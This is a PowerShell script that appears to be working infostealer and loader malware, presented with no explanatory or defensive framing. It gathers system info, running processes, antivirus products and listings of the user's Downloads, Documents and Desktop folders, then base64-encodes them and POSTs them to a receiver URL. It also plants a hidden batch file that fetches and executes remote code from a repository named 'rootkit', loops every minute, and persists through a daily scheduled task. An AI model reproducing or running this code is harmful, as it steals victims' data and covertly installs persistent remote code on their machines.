$srsdf='http://localhost/receive.php' 

function GetFile() {
	param (
        $mytar,
	    $name
       )
	Write-Output $name
	$dhd=[IO.File]::readallbytes($mytar);
	$kfjh=[System.Convert]::ToBase64String($dhd);
	$kfjh=[regex]::Replace($kfjh,'=','%');
	$msgin='access='+$kfjh+'&name='+$name;
	Invoke-WebRequest -Uri $srsdf -Method Post -Body $msgin;
}

$da = "{0:yyyyMMddHHmmss}" -f (Get-Date)
$filename = "$env:appdata\koala_$da"

$rc = Get-ChildItem ([Environment]::GetFolderPath('Recent'))
$ic = ipconfig /all
$gp=Get-process
$sy = systeminfo
$antivirusInfo = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntivirusProduct
$anvi = $antivirusInfo | Select-Object DisplayName, ProductState, PathToSignedProductExe
Write-Output $anvi

ac $filename $rc -Encoding 'utf8'
ac $filename $ic
ac $filename $gp
ac $filename $sy
ac $filename $anvi

$name = "info.log"

GetFile $filename $name

del $filename

$down = "$env:Appdata\down.txt"
$docu = "$env:Appdata\docu.txt"
$desk = "$env:Appdata\desk.txt"
dir "$env:userprofile\Downloads" -depth 10 >> $down
dir "$env:userprofile\Documents" -depth 10 >> $docu
dir "$env:userprofile\Desktop" -depth 10 >> $desk
GetFile $down "down.txt"
GetFile $docu "docu.txt"
GetFile $desk "desk.txt"

del $down
del $docu
del $desk

function Set_bootACL($filepath)
{
	attrib +S +H $filepath
}

$paFile        = $env:appdata + '\koau.bat'
$content1 ="cmd /c start /min powershell start-process powershell {[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/logger')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;} -windowstyle hidden"
$content2 = "cmd /c start /min powershell start-process powershell {while(`$true){[string]`$nbvccxx={(New-Object Net.WebClient).Downloadstring('https://raw.githubusercontent.com/smrroot/rootkit/refs/heads/main/lock.txt')};`$qweewqq=`$nbvccxx.Replace('wererfvx','');`$zxdsxxxxc=iex `$qweewqq;invoke-expression `$zxdsxxxxc;start-sleep -s 60}} -windowstyle hidden"
$sef = $content1 + "`r`n" + "timeout `/t 1 `/nobreak >nul" + "`r`n" + $content2
sc -Path $paFile -Value $sef -Encoding 'ascii'
# sc $paFile $content2 -Encoding 'utf8'
Set_bootACL($paFile)
schtasks /create /tn "koauSche" /tr "$paFile" /sc daily /st 01:35 /f
Start-Process -FilePath $paFile -WindowStyle Hidden
# schtasks /create /tn "koauSche" /tr "$paFile" /sc onlogon


